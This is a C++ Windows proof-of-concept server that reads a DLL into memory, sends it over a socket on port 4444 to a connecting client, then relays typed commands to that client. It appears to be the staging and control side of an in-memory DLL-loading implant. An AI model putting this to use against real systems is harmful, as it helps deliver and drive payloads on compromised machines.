#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define success(str) std::cout << "[+] " << str << std::endl
#define error(str) std::cout << "[-] " << str << " " << GetLastError() << std::endl
#define info(str) std::cout << "[*] " << str << std::endl

int main()
{
	const char* file_path = "<PATH TO DLL"; //File path to the Dll to load

	WSAData data;
	WSAStartup(MAKEWORD(2, 2), &data); //Initiates winsock

	HANDLE hFile;
	DWORD dwFileSize, dwBytesRead;
	
	hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, 3, FILE_ATTRIBUTE_NORMAL, NULL); //Opens the dll file, fails if it does not exist
	if (hFile == INVALID_HANDLE_VALUE)
	{
		error("Error opening file");
		WSACleanup();
		return 0;
	}
	success("File handle opened");
	
	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) //Gets the file size in bytes
	{
		error("GetFileSize error");
		CloseHandle(hFile);
		WSACleanup();
		return 0;
	}

	LPBYTE dllInfo = (LPBYTE)VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //Allocated virtual memory to store the file
	if (dllInfo == NULL)
	{
		error("VirtualAlloc error");
		CloseHandle(hFile);
		WSACleanup();
		return 0;
	}
	success("Memory allocated");
	printf("0x%p\n", dllInfo);

	if (!ReadFile(hFile, dllInfo, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) //Places the file into memory
	{
		error("ReadFile error");
		CloseHandle(hFile);
		WSACleanup();
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		return 0;
	}
	CloseHandle(hFile);
	success("File read into memory");

	SOCKET serverfd, clientfd;
	serverfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	InetPtonA(AF_INET, "127.0.0.1", &addr.sin_addr); //Creates the socket and sockaddr structures

	if (bind(serverfd, (sockaddr*)&addr, sizeof(addr)) != 0) //Binds the socket to the listening port
	{
		error("Bind error");
		VirtualFree(dllInfo, 0, MEM_RELEASE);
		WSACleanup();
		return 0;
	}

	info("Server started");

	listen(serverfd, 2); //Listens for connections
	clientfd = accept(serverfd, NULL, NULL); //Gets the client socket object (or file descriptor if your familiar with linux) on connection
	info("Client connected");


	//Send the file over the socket
	int total_bytes = 0, remainingBytes, bytesToSend, bytes_sent;
	while (total_bytes < dwFileSize)
	{
		std::cout << std::endl << total_bytes << std::endl;
		remainingBytes = dwFileSize - total_bytes;
		bytesToSend = ((remainingBytes < 1024 ? remainingBytes : 1024));
		
		bytes_sent = send(clientfd, (char*)dllInfo + total_bytes, bytesToSend, 0);
		std::cout << bytes_sent << std::endl;
		if (bytes_sent == -1)
		{
			error("Send error");
			VirtualFree(dllInfo, 0, MEM_RELEASE);
			WSACleanup();
			return 0;
		}

		total_bytes += bytes_sent;
		
		std::cout << "\r" << total_bytes << "/" << dwFileSize << std::flush;
	}
	closesocket(clientfd); //Closes up the connection
	std::cout << std::endl;
	success("File sent!");

	info("Listening for reconnect");
	clientfd = accept(serverfd, NULL, NULL); //Sets up for a reconnect from the client
	//I could make a version that does not require this but figured its not a big deal since
	//this is just a proof of concept
	
	//Prompts the user for what functions to run (plus arguments in the format FUNCTION arg1 arg2 etc
	std::string input;
	while (true)
	{
		std::cout << "cmd> ";
		std::getline(std::cin, input);
		std::cout << "Input: " << input << std::endl;
		send(clientfd, input.c_str(), input.length() + 1, 0);
		
		if (input == "exit")
			break;
	}

	//Closes up the sockets and winsock
	closesocket(clientfd);
	closesocket(serverfd);
	WSACleanup();
	return 0;
}